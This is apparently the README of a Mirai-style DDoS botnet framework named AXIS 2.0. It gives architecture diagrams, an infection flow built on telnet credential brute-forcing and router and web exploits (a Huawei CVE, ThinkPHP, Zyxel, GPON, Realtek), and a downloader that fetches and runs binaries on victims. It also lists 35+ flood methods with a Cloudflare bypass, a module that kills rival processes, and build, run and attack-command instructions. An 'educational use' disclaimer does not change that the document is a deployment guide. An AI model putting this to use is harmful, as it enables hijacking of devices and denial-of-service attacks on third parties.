# AXIS 2.0 Botnet

A powerful DDoS botnet framework.

## System Architecture

```
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                         AXIS 2.0 BOTNET - HIGH LEVEL ARCHITECTURE                                   │
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

                                            ┌──────────────────────┐
                                            │   INFRASTRUCTURE     │
                                            │   (Your Server)      │
                                            └──────────┬───────────┘
                                                       │
         ┌─────────────────────────────────────────────┼─────────────────────────────────────────────┐
         │                                             │                                             │
         ▼                                             ▼                                             ▼
┌─────────────────┐                         ┌──────────────────┐                          ┌─────────────────┐
│   C&C SERVER    │                         │   SCAN LISTENER  │                          │     LOADER      │
│   (Go - main.go)│                         │   (Go - Go)      │                          │   (C - loader)  │
│   Port: 3778    │                         │   Port: 9555     │                          │   Port: 23      │
└────────┬────────┘                         └────────┬─────────┘                          └────────┬────────┘
         │                                           │                                            │
         │                                           │                                            │
         ▼                                           ▼                                            ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                              NETWORK LAYER                                                       │
│                                                                                                                  │
│    ┌────────────────┐    ┌────────────────┐    ┌────────────────┐    ┌────────────────┐    ┌────────────────┐   │
│    │  Telnet Bots   │    │  HTTP Servers  │    │  TFTP Servers  │    │  FTP Servers   │    │  Exploit Targets│   │
│    │  (Port 23)     │    │  (Port 80)     │    │  (Port 69)     │    │  (Port 21)     │    │  (Various)     │   │
│    └────────────────┘    └────────────────┘    └────────────────┘    └────────────────┘    └────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
         │                                           │                                            │
         │                                           │                                            │
         ▼                                           ▼                                            ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                           BOT INFESTATION LAYER                                                 │
│                                                                                                                  │
│    ┌─────────────────────────────────────────────────────────────────────────────────────────────────────────┐   │
│    │                                    INFECTED DEVICE (BOT)                                                 │   │
│    │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │   │
│    │  │  MAIN.C      │  │  ATTACK.C    │  │  SCANNER.C   │  │  KILLER.C    │  │  UTIL.C      │              │   │
│    │  │  - Connect   │  │  - UDP Flood │  │  - Telnet    │  │  - Kill      │  │  - Local IP  │              │   │
│    │  │  - C&C Loop  │  │  - TCP SYN   │  │  - Brute     │  │  - Rivals    │  │  - Strings   │              │   │
│    │  │  - Keepalive │  │  - ACK Flood │  │  - Report    │  │  - Ports     │  │  - Memory    │              │   │
│    │  │              │  │  - VSE       │  │              │  │              │  │              │              │   │
│    │  │              │  │  - DNS       │  │              │  │              │  │              │              │   │
│    │  │              │  │  - GRE       │  │              │  │              │  │              │              │   │
│    │  │              │  │  - HTTP      │  │              │  │              │  │              │              │   │
│    │  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘              │   │
│    │                                                                                                          │   │
│    │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │   │
│    │  │ HUAWEI.C     │  │ THINKPHP.C   │  │  ZYXEL.C     │  │  KILLER.C    │  │  RESOLV.C    │              │   │
│    │  │ - CVE-2018-  │  │ - RCE Exploit│  │ - CGI Inject │  │ - Anti-      │  │ - DNS        │              │   │
│    │  │ 10561        │  │ - Web Apps   │  │ - Routers    │  │   Malware    │  │   Resolver   │              │   │
│    │  │ - SOAP       │  │              │  │              │  │              │  │              │              │   │
│    │  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘              │   │
│    └─────────────────────────────────────────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

## Detailed Component Interaction Flow

```
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                        INFECTION & PROPAGATION FLOW                                                │
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

    STEP 1: INITIAL INFECTION                      STEP 2: SELF-REPLICATION
    ─────────────────────────                      ────────────────────────

    ┌─────────────┐                                ┌──────────────────────────────────────────┐
    │   LOADER    │                                │           BOT SCANNER MODULE             │
    │             │                                │                                          │
    │  [stdin]    │                                │  ┌────────────────────────────────────┐  │
    │  IP:USER:   │────┐                           │  │  Telnet Brute-Force Scanner        │  │
    │  PASS:ARCH  │    │                           │  │  - 200+ Credentials                │  │
    │             │    │                           │  │  - Port 23                         │  │
    └─────────────┘    │                           │  └─────────────────┬───────────────────┘  │
                       │                           │                    │                      │
         ┌─────────────┴─────────────┐             │                    ▼                      │
         │                           │             │         ┌────────────────────────┐       │
         ▼                           │             │         │  Found Valid Login     │       │
    ┌─────────────┐                  │             │         │  IP:Port:User:Pass     │       │
    │   HTTP/TFTP │                  │             │         └───────────┬────────────┘       │
    │   SERVER    │                  │             │                     │                    │
    │             │                  │             │                     ▼                    │
    │  /bins/     │                  │             │         ┌────────────────────────┐       │
    │  axis.$ARCH │                  │             │         │  Report to C&C         │       │
    │             │                  │             │         │  Port 9555             │       │
    └─────────────┘                  │             │         └───────────┬────────────┘       │
         │                           │             │                     │                    │
         │  ┌────────────────────────┘             │                     │                    │
         │  │                                      │                     │                    │
         ▼  ▼                                      ▼                     ▼                    │
    ┌─────────────────┐                       ┌──────────────────────────────────────────┐   │
    │   DOWNLOADER    │                       │           EXPLOIT SCANNERS               │   │
    │   (DLR)         │                       │                                          │   │
    │                 │                       │  ┌────────────┐  ┌────────────┐         │   │
    │  - wget binary  │                       │  │  HUAWEI    │  │ THINKPHP   │         │   │
    │  - /tmp/axis   │                       │  │  CVE-2018- │  │ RCE        │         │   │
    │  - chmod +x     │                       │  │  10561     │  │ Scanner    │         │   │
    │  - execute      │                       │  │  SOAP      │  │ Port 80    │         │   │
    └────────┬────────┘                       │  └────────────┘  └────────────┘         │   │
             │                                 │                                          │   │
             │                                 │  ┌────────────┐  ┌────────────┐         │   │
             │                                 │  │  ZYXEL     │  │  GPON      │         │   │
             │                                 │  │  CGI       │  │  Port 8080 │         │   │
             │                                 │  │  Port 8080 │  │  Exploit   │         │   │
             │                                 │  └────────────┘  └────────────┘         │   │
             │                                 │                                          │   │
             │                                 │  ┌────────────┐  ┌────────────┐         │   │
             │                                 │  │ REALTEK    │  │  Other     │         │   │
             │                                 │  │ SDK        │  │  Exploits  │         │   │
             │                                 │  │ Port 80    │  │            │         │   │
             │                                 │  └────────────┘  └────────────┘         │   │
             │                                 └──────────────────────────────────────────┘   │
             │                                                                                │
             ▼                                                                                │
    ┌─────────────────────────────────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                              NEW BOT ACTIVE - CONNECTS TO C&C                               │
│                                                                                              │
│    ┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐         │
│    │  Connect to  │────▶│  Send Bot    │────▶│  Wait for    │────▶│  Execute     │         │
│    │  C&C:3778    │     │  ID Packet   │     │  Commands    │     │  Attacks     │         │
│    └──────────────┘     └──────────────┘     └──────────────┘     └──────────────┘         │
│                                                                                              │
│    ┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐         │
│    │  KILLER      │     │  WATCHDOG    │     │  ANTI-DEBUG  │     │  SINGLE      │         │
│    │  Module      │     │  (optional)  │     │  (SIGTRAP)   │     │  INSTANCE    │         │
│    │              │     │              │     │              │     │  Check       │         │
│    │ - Kill Rivals │    │   watchdog   │     │              │     │              │         │
│    └──────────────┘     └──────────────┘     └──────────────┘     └──────────────┘         │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
```

## C&C Server Architecture

```
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   C&C SERVER (Go) - Port 3778                               │
└─────────────────────────────────────────────────────────────────────────────────────────────┘

                                    ┌─────────────────────┐
                                    │   main.go           │
                                    │   - Listen TCP      │
                                    │   - initialHandler  │
                                    └──────────┬──────────┘
                                               │
                    ┌──────────────────────────┼──────────────────────────┐
                    │                          │                          │
                    ▼                          ▼                          ▼
          ┌─────────────────┐       ┌─────────────────┐       ┌─────────────────┐
          │   bot.go        │       │   admin.go      │       │   api.go        │
          │   - Bot struct  │       │   - Admin panel │       │   - REST API    │
          │   - Handle()    │       │   - Login       │       │   - API Key     │
          │   - QueueBuf()  │       │   - Commands    │       │   - Commands    │
          └────────┬────────┘       └────────┬────────┘       └────────┬────────┘
                   │                         │                         │
                   │                         │                         │
                   ▼                         ▼                         ▼
          ┌─────────────────────────────────────────────────────────────────────────┐
          │                              attack.go                                   │
          │                                                                          │
          │  ┌────────────────────────────────────────────────────────────────────┐ │
          │  │                    ATTACK METHODS (35+)                            │ │
          │  │                                                                     │ │
          │  │  UDP: udp, udpplain, std, nudp, udphex, socket-raw, samp,          │ │
          │  │       udp-strong, hex-flood, strong-hex, ovhudp, cudp, icee,       │ │
          │  │       randhex, ovh, ovhdrop, nfo                                   │ │
          │  │                                                                     │ │
          │  │  TCP: tcp, syn, ack, stomp, hex, stdhex, xmas, tcpall, tcpfrag,    │ │
          │  │       asyn, usyn, ackerpps, tcp-mix, tcpbypass, nfolag, ovhnuke,   │ │
          │  │       raw                                                          │ │
          │  │                                                                     │ │
          │  │  SPECIAL: vse, dns, greip, greeth                                  │ │
          │  │                                                                     │ │
          │  │  HTTP: http, https, cf (Cloudflare bypass)                         │ │
          │  └────────────────────────────────────────────────────────────────────┘ │
          └─────────────────────────────────────────────────────────────────────────┘
                   │
                   │
                   ▼
          ┌─────────────────────────────────────────────────────────────────────────┐
          │                         clientList.go                                    │
          │                                                                          │
          │    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐             │
          │    │  AddClient   │    │  DelClient   │    │  QueueBuf    │             │
          │    │  (new bot)   │    │  (disconnect)│    │  (attack)    │             │
          │    └──────────────┘    └──────────────┘    └──────────────┘             │
          └─────────────────────────────────────────────────────────────────────────┘
                   │
                   │
                   ▼
          ┌─────────────────────────────────────────────────────────────────────────┐
          │                         database.go                                      │
          │                                                                          │
          │    MySQL Database (AXIS2)                                                │
          │    ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐          │
          │    │   users    │ │  history   │ │ whitelist  │ │  logins    │          │
          │    │ - username │ │ - attacks  │ │ - prefixes │ │ - activity │          │
          │    │ - password │ │ - duration │ │ - netmask  │ │ - IPs      │          │
          │    │ - max_bots │ │ - timestamps││ - protect  │ │ - audit    │          │
          │    │ - admin    │ │            │ │            │ │            │          │
          │    │ - api_key  │ │            │ │            │ │            │          │
          │    └────────────┘ └────────────┘ └────────────┘ └────────────┘          │
          └─────────────────────────────────────────────────────────────────────────┘
```

## Attack Command Flow

```
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                                    ATTACK COMMAND FLOW                                       │
└─────────────────────────────────────────────────────────────────────────────────────────────┘

    USER/ADMIN                          C&C SERVER                           BOTS
      │                                     │                                  │
      │  ┌──────────────────────────────────┤                                  │
      │  │ "udp 1.2.3.4 30 dport=80"        │                                  │
      │  ▼                                  │                                  │
      │                            ┌────────────────┐                          │
      │                            │  attack.go     │                          │
      │                            │  NewAttack()   │                          │
      │                            │  - Parse cmd   │                          │
      │                            │  - Validate    │                          │
      │                            │  - Build buf   │                          │
      │                            └───────┬────────┘                          │
      │                                    │                                   │
      │                                    ▼                                   │
      │                            ┌────────────────┐                          │
      │                            │  database.go   │                          │
      │                            │  - Check whitelist                        │
      │                            │  - Check limits                           │
      │                            │  - Log history                            │
      │                            └───────┬────────┘                          │
      │                                    │                                   │
      │                                    ▼                                   │
      │                            ┌────────────────┐                          │
      │                            │  clientList.go │                          │
      │                            │  QueueBuf()    │──────────────────────────┤
      │                            └────────────────┘                          │
      │                                                                        │
      │                                                                        ▼
      │                                                                ┌───────────────┐
      │                                                                │  bot/main.c │
      │                                                                │  - Read cmd │
      │                                                                │  - Parse    │
      │                                                                └───────┬───────┘
      │                                                                        │
      │                                                                        ▼
      │                                                                ┌───────────────┐
      │                                                                │  attack.c     │
      │                                                                │  attack_start()│
      │                                                                │  - Fork()     │
      │                                                                │  - Launch     │
      │                                                                └───────┬───────┘
      │                                                                        │
      │                                                                        ▼
      │                                                                ┌───────────────┐
      │                                                                │  Raw Sockets  │
      │                                                                │  - UDP Flood  │
      │                                                                │  - TCP SYN    │
      │                                                                │  - etc...     │
      │                                                                └───────────────┘
      │
      ▼
```

## Killer Module (Competing Malware Elimination)

```
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                                    KILLER MODULE ARCHITECTURE                                │
└─────────────────────────────────────────────────────────────────────────────────────────────┘

    ┌──────────────────────────────────────────────────────────────────────────────────────┐
    │                         BOT: killer.c                                                 │
    │                                                                                       │
    │    Scan Interval: Every 600 seconds                                                   │
    │    Minimum PID: 400                                                                   │
    │                                                                                       │
    │    ┌─────────────────────────────────────────────────────────────────────────────┐   │
    │    │  PROCESS NAME SCANNING                                                       │   │
    │    │                                                                              │   │
    │    │  Scan /proc/[pid]/exe and /proc/[pid]/cmdline                               │   │
    │    │                                                                              │   │
    │    │  Target Names:                                                               │   │
    │    │  - axis_bot, rival_ddos, competitor, malware_scanner                        │   │
    │    │  - busybox, miner, xmr, ircbot, bot                                         │   │
    │    │                                                                              │   │
    │    │  Action: kill(pid, SIGKILL)                                                  │   │
    │    └─────────────────────────────────────────────────────────────────────────────┘   │
    │                                                                                       │
    │    ┌─────────────────────────────────────────────────────────────────────────────┐   │
    │    │  PORT SCANNING                                                               │   │
    │    │                                                                              │   │
    │    │  Scan /proc/net/tcp for listening ports                                     │   │
    │    │                                                                              │   │
    │    │  Target Ports:                                                               │   │
    │    │  - 23 (Telnet)     - 48101 (Rival C&C)  - 6666/6667 (IRC)                   │   │
    │    │  - 22 (SSH)        - 1991 (Competitor)  - 8080 (Alt HTTP)                   │   │
    │    │  - 80 (HTTP)       - 1338 (Other bots)                                       │   │
    │    │  - 443 (HTTPS)                                                               │   │
    │    │                                                                              │   │
    │    │  Action: Find inode → Find PID → kill(pid, SIGKILL)                         │   │
    │    └─────────────────────────────────────────────────────────────────────────────┘   │
    └──────────────────────────────────────────────────────────────────────────────────────┘
```

## Network Tools (Admin Panel)

```
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                                    ADMIN PANEL TOOLS                                         │
└─────────────────────────────────────────────────────────────────────────────────────────────┘

    ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐
    │  IPLOOKUP    │  │  PORTSCAN    │  │  WHOIS       │  │  PING        │
    │              │  │              │  │              │  │              │
    │  ip-api.com  │  │ hackertarget │  │ hackertarget │  │ hackertarget │
    │  GeoIP info  │  │  Nmap scan   │  │  Domain info │  │  Nping       │
    └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘

    ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐
    │  TRACEROUTE  │  │  RESOLVE     │  │  REVERSEDNS  │  │  ASNLOOKUP   │
    │              │  │              │  │              │  │              │
    │  MTR lookup  │  │  Host search │  │  Reverse IP  │  │  ASN info    │
    └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘

    ┌──────────────┐  ┌──────────────┐
    │  SUBNETCALC  │  │  ZONETRANSFER│
    │              │  │              │
    │  CIDR calc   │  │  DNS AXFR    │
    └──────────────┘  └──────────────┘
```

## Features


### Combined Attack Methods (35+)
- **UDP Floods**: udp, udpplain, std, nudp, udphex, socket-raw, samp, udp-strong, hex-flood, strong-hex, ovhudp, cudp, icee, randhex, ovh, ovhdrop, nfo
- **TCP Floods**: tcp, syn, ack, stomp, hex, stdhex, xmas, tcpall, tcpfrag, asyn, usyn, ackerpps, tcp-mix, tcpbypass, nfolag, ovhnuke, raw
- **Special Attacks**: vse, dns, greip, greeth
- **HTTP Attacks**: http, https
- **Bypass Methods**: cf (Cloudflare)

### Self-Replication Scanners
- Telnet credential scanner (200+ credentials)
- Huawei router exploit (CVE-2018-10561)
- ThinkPHP RCE exploit
- Zyxel router exploit
- GPON router exploit (ports 80, 8080)
- Realtek SDK exploit

### Competing Malware Killer
Targets and eliminates:
- Rival botnets
- Competing malware
- IRC bots
- Cryptocurrency miners

### Administration
- Telnet-based admin panel
- REST API for remote control
- User management (basic/admin accounts)
- Attack logging
- Network tools (iplookup, resolve, asnlookup, etc.)

## Directory Structure

```
production source/
├── cnc/           # AXIS 2.0 Command & Control server (Go)
├── bot/           # Bot source code (C)
├── loader/        # Telnet loader (C)
├── dlr/           # Downloader (C)
├── logs/          # Log files
├── bins/          # Compiled binaries
├── build.sh       # Build script
└── README.md      # This file
```

## Installation

### Prerequisites
- Ubuntu/CentOS/Debian Linux
- Go 1.13+
- GCC with cross-compilation toolchains
- MySQL/MariaDB
- Apache/Nginx (for binary hosting)
- TFTP server
- FTP server

### 1. Install Dependencies

```bash
# Ubuntu/Debian
apt-get update
apt-get install -y golang-go gcc g++ mysql-server apache2 tftpd-hpa vsftpd
apt-get install -y gcc-arm-linux-gnueabi gcc-mips-linux-gnu gcc-powerpc-linux-gnu

# Cross-compiler setup (optional, for multi-arch builds)
# Download from https://www.mentorsys.de/cross-compiler
```

### 2. Set Up Database

```bash
mysql -u root -p < database.sql
```

Default database name: `AXIS2`

### 3. Configure

Edit the following files with your server details:

- `cnc/main.go` - Database connection, listen addresses
- `bot/config.h` - C&C address, ports
- `loader/config.h` - HTTP/TFTP server addresses
- `dlr/dlr.h` - Download server address

### 4. Build

```bash
chmod +x build.sh
./build.sh
```

### 5. Run

```bash
# Terminal 1: C&C Server
cd "production source"
./cnc_server

# Terminal 2: Scan Listener
./scanListen

# Terminal 3: Loader
./loader < list.txt
```

## Default Credentials

After setting up the database:
- **Admin Username:** `admin`
- **Admin Password:** `admin123` (change immediately!)
- **Admin API Key:** `AXIS2-ADMIN-APIKEY` (change immediately!)

**Default Database:** AXIS2

## Usage

### Admin Panel Commands

```
HELP       - Show help menu
METHODS    - Show attack methods
RULES      - Show rules
INFO       - User information
ADMIN      - Admin commands (admins only)
TOOLS      - Network tools

Attack: <method> <target> <duration> dport=<port>
Example: udp 1.2.3.4 30 dport=80
```

### API Usage

```
POST to API endpoint
Format: APIKEY|<command>

Commands:
- amountbots - Get bot count
- -<count> <attack> - Launch attack with specific bot count
```

## Attack Methods Reference

| Method | Description | Best For |
|--------|-------------|----------|
| udp | Standard UDP flood | General use |
| tcp | TCP flood with options | Bypass firewalls |
| syn | SYN flood | Connection exhaustion |
| ack | ACK flood | Stateful firewall bypass |
| vse | Valve Source Engine | Game servers |
| dns | DNS water torture | DNS servers |
| http | HTTP flood | Web servers |
| greip | GRE IP tunnel | Advanced bypass |

## Security Notes

⚠️ **WARNING**: This software is provided for educational purposes only.
- Only use on networks you own or have explicit permission to test
- Unauthorized use is illegal
- The authors are not responsible for misuse

## Troubleshooting

### Bot won't connect
1. Check C&C address in `bot/config.h`
2. Verify port 3778 is open
3. Check firewall rules

### Loader not infecting
1. Verify binary permissions (chmod 777)
2. Check HTTP/TFTP server is running
3. Verify credentials in scanner

### Build fails
1. Install missing cross-compilers
2. Check Go modules: `go mod tidy`
3. Install MySQL dev headers: `apt-get install libmysqlclient-dev`

## Credits

Developed by AXIS Group

## License

Educational use only. All rights reserved.
